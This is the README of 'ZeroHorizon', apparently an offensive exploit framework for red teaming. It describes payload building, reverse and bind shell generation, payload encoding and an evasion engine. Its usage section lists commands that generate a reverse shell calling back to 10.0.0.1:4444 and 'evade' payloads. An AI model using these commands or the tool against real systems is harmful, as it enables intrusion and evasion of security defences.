### `README.md`
```markdown
# ZeroHorizon - Advanced Modular Exploit Framework

**Author:** Mr. Axolotl (NulLNet)

## Overview
ZeroHorizon is a high-performance, modular exploit framework built for advanced red teaming, penetration testing, and evasion tactics. Inspired by top-tier commercial tools.

## Features
- Modular architecture
- Payload builder with multiple formats
- Shell generation (reverse/bind)
- Payload encoding (xor, base64, rot13)
- Evasion engine
- Plugin system
- CLI support

## Usage
```bash
python3 zero.py --mode build --format elf --ip 10.0.0.1 --port 4444
python3 zero.py --mode shell --type reverse --ip 10.0.0.1 --port 4444
python3 zero.py --mode encode --technique xor --file payload.bin
python3 zero.py --mode evade --file payload.bin
python3 zero.py --mode plugin --plugin sample_plugin --target 192.168.1.10
```

## Plugin Development
Create plugins inside `plugins/` by extending `core.plugin_base.PluginBase`

---
